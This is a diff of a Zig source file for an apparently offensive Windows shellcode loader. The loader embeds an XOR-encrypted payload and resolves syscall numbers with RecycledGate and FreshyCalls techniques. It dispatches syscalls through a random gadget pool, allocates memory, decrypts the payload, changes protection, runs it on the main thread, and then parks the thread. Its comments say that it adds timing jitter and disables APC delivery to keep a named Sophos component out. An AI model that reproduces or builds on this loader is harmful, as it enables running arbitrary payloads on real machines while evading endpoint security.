@@ -2,6 +2,8 @@
 // RecycledGate SSN resolution (byte-scan primary, FreshyCalls + delta fallback),
 // random gadget pool dispatch, direct call on main thread, park forever.
 
+//--------------------------------------------------------> IMPORTS + PER-BUILD KEY
+
 const std = @import("std");
 const windows = std.os.windows;
 const nt = @import("nt.zig");
@@ -14,6 +16,8 @@ const key_bytes: [16]u8 = @bitCast(build_options.shellcode_key);
 
 var g_sys: syscall.Syscalls = undefined;
 
+//--------------------------------------------------------> LOGGING HELPERS
+
 // logging helpers.
 fn ok(comptime fmt: []const u8, args: anytype) void {
     print("[+] " ++ fmt ++ "\n", args);
@@ -25,8 +29,11 @@ fn err(comptime fmt: []const u8, args: anytype) void {
     print("[-] " ++ fmt ++ "\n", args);
 }
 
+//--------------------------------------------------------> PAYLOAD EMBED
 // per-build XOR-encrypted payload from build.zig. drop payload.bin in src/.
 const shellcode = @embedFile("payload_enc.bin");
+
+//--------------------------------------------------------> BANNER
 
 fn banner() void {
     print(
@@ -35,6 +42,19 @@ fn banner() void {
         \\
     , .{});
 }
+
+//--------------------------------------------------------> JITTER
+// pseudorandom sleep between stages. not crypto, just noise.
+fn jitter(min_ms: u64, max_ms: u64) void {
+    const delay: i64 = -@as(i64, @intCast(min_ms * 10000 + (@as(u64, @intFromPtr(&min_ms)) % ((max_ms - min_ms + 1) * 10000))));
+    _ = syscall.syscall_dispatch(
+        g_sys.NtDelayExecution.number,
+        &[_]usize{ 0, @intFromPtr(&delay) },
+        2,
+    );
+}
+
+//--------------------------------------------------------> MAIN (resolve → alloc → decrypt → protect → exec → park)
 
 pub fn main() void {
     banner();
@@ -57,8 +77,8 @@ pub fn main() void {
     print("    NtProtectVirtualMemory   ssn={d}\n", .{g_sys.NtProtectVirtualMemory.number});
     print("    NtDelayExecution         ssn={d}\n", .{g_sys.NtDelayExecution.number});
 
-    const current_process: windows.HANDLE = nt.NtCurrentProcess;
-    var base_addr: ?*anyopaque = null;
+    const current_process: windows.HANDLE = nt.NtCurrentProcess; // handle to our own process
+    var base_addr: ?*anyopaque = null; // allocation base
     var size: windows.SIZE_T = shellcode.len;
 
     // allocate RW memory.
@@ -102,26 +122,16 @@ pub fn main() void {
     }
     jitter(5, 15);
 
-    // direct call on the main thread. if the payload starts its own threads and
-    // returns (Donut does), park this thread forever so the process stays alive.
-    // alertable=0 — no APC can ever be delivered on this thread again.
+    // direct call on the main thread — no thread created, no APC queued.
     info("executing on main thread (no new thread, no APC)", .{});
     const entry: *const fn () callconv(.c) void = @ptrCast(base_addr);
     entry();
 
+    // payload returned — park forever with APC delivery disabled.
+    // alertable=0 means no APC can ever land on this thread, keeping Sophos' hmpalert out.
     info("payload returned — parking thread (NtDelayExecution, alertable=0)", .{});
     const day: i64 = -@as(i64, 24 * 60 * 60 * 10_000_000);
     while (true) {
         _ = syscall.syscall_dispatch(g_sys.NtDelayExecution.number, &[_]usize{ 0, @intFromPtr(&day) }, 2);
     }
-}
-
-// pseudorandom sleep between stages. not crypto, just noise.
-fn jitter(min_ms: u64, max_ms: u64) void {
-    const delay: i64 = -@as(i64, @intCast(min_ms * 10000 + (@as(u64, @intFromPtr(&min_ms)) % ((max_ms - min_ms + 1) * 10000))));
-    _ = syscall.syscall_dispatch(
-        g_sys.NtDelayExecution.number,
-        &[_]usize{ 0, @intFromPtr(&delay) },
-        2,
-    );
 }
